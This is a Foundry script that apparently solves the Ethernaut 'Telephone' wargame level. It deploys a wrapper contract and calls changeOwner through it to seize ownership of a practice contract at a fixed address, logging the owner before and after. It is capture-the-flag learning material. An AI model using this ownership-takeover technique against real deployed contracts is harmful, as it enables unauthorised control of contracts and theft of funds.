// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "ethernaut/Telephone/TelephoneWrapper.sol";
import "ethernaut/Telephone/Telephone.sol";
import "forge-std/Test.sol";
import "ethernaut/EthernautTestHelpers.sol";

contract Telephone_script is Test, EthernautTestHelpers {
    function run() public {
        uint256 PKEY = vm.envUint("DEPLOYMENT_KEY");
        vm.startBroadcast(PKEY);
        Telephone telephone = Telephone(
            0xbCf724C9e37468fBCDd0a093203fe7f314121A58
        );
        TelephoneWrapper instance = new TelephoneWrapper();
        address ownerOfInstance = telephone.owner();
        console.log("Owner of instance: %s", ownerOfInstance);
        instance.changeOwner(w_main);
        ownerOfInstance = telephone.owner();
        console.log("Owner of instance: %s", telephone.owner());
        vm.stopBroadcast();
    }
}
